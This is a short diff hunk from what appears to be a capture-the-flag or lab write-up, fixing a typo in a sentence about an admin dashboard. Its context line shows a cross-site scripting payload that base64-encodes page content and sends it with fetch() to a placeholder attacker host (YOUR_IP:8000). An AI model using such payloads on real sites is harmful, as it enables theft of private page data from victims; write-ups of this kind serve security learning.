@@ -121,7 +121,7 @@ fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
 });
 ```
 
-With this payload we start getting hits the show an admin page  with a couple of links:
+With this payload we start getting hits that show an admin page  with a couple of links:
 
 ```html
   <h1>Dashboard</h1>
